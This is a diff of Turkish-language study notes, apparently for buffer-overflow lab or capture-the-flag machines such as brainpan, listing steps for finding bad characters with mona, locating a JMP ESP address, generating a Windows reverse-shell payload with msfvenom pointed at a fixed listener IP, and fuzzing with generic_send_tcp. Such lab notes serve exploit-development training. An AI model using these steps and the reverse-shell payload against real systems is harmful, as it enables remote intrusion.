@@ -8,16 +8,21 @@
 
 5)afterip.py kullanarak tam denk gelen numarayı test et
 
+NOT:"!mona config -set workingfolder c:\mona\%p" yazarak 6-7. adımlar için istediğimiz yerleri seçebiliyoruz.
+
 6)başarılı olursa afterip nin buffer sounua badchars ları yapıştır, ardından immunity debugger da "!mona bytearray -b "\x00"" yazarak temiz bir badchar karşılaştırması için bunu yaz sonuç C dizininde mona altına kayıt edilecek (C:\mona\brainpan\bytearray.bin)
 
-7) Ardından afterip'ye badcharsı koyarak çalıştır. immunity debugger üzerinde "414141" üstünde olan yeri kopyala ("üstten 5.[ESP]"). Sonrasında "!mona compare -f C:\path\to\bytearray.bin -a 005FF910" yazarak badchar bar mı diye karşılaştır.
+7) Ardından afterip'ye badcharsı koyarak çalıştır. immunity debugger üzerinde "414141" üstünde olan yeri kopyala ("üstten 5.[ESP]"). Sonrasında "!mona compare -f C:\mona\dostackbufferoverflowgood -a 014E19F8" yazarak badchar bar mı diye karşılaştır.
 
 8) Örneğin var ise şu şekilde "00 07 08 2e 2f a0 a1" yeni bir bytearray oluştur "!mona bytearray -b "\x00\x07\x08\xa0\xa1\x2e\x2f""
 
 9)immunity debugger üzerinden !mona jmp -r esp -cpb "\x00" yazarak jmp esp yi bul. badchar var ise böyle "!mona jmp -r esp -cpb "\x00\x07\x08\xa0\xa1\x2e\x2f""
 
-10)Ekranı küçültünce log datada result olarak gösterilir("0x311712f3") şeklinde.
+10)Ekranı küçültünce log datada result olarak gösterilir("0x311712f3") şeklinde. 625011AF
 
-11) msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.157.58 LPORT=4545 -f python -b "\x00" (-b yerinde badcharları koyuyurouz)
+11) msfvenom -p windows/shell_reverse_tcp LHOST=10.9.157.58 LPORT=4545 -f python -b "\x00" (-b yerinde badcharları koyuyurouz)
 
 12) ardından exploite çıkan kodu yerleştir ve esp kodumuz şu an "0x311712f3" bunu şu şekilde yaz "\xf3\x12\x17\x31"
+
+NOT: EĞER HİÇİR ŞEY ÇIKMAZ İSE generic_senc_tcp kullan ("generic_send_tcp ip port TRUN.SPK 0 0 ") TRUN spk içine string yerine gerkli string ile doldur
+
